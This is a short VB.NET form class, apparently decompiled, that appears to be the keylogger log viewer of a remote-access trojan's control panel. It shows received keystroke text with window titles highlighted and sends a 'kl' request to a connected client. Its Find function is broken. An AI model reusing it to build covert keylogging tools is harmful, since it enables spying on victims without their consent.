Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class kl

    Public c As Client
    Private last As ListViewItem

    Private Sub kl_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub CopyToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.T1.Copy()
    End Sub

    Private Sub FindToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FindToolStripMenuItem.Click
        If (Interaction.InputBox("Enter Word To Find", "Search", "", -1, -1).Length <> 0) Then
            Dim kl As kl = Me
            SyncLock kl
                Me.T1.SelectedText = ""
            End SyncLock
        End If
    End Sub

    Public Sub insert(ByVal T As String)
        If (T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))) Then
            Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
            Me.T1.SelectionColor = Color.SteelBlue
            Me.T1.AppendText((ChrW(13) & ChrW(10) & "[ " & T.Replace(ChrW(1), "") & "]" & ChrW(13) & ChrW(10)))
        Else
            Me.T1.SelectionFont = Me.T1.Font
            Me.T1.SelectionColor = Color.Black
            Me.T1.AppendText((T & ChrW(13) & ChrW(10)))
        End If
    End Sub

    Private Sub ReToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReToolStripMenuItem.Click
        Try
            Me.c.Send("kl")
            Me.ReToolStripMenuItem.Enabled = False
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        Me.T1.SelectAll()
    End Sub

    Private Sub T1_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles T1.TextChanged
    End Sub

End Class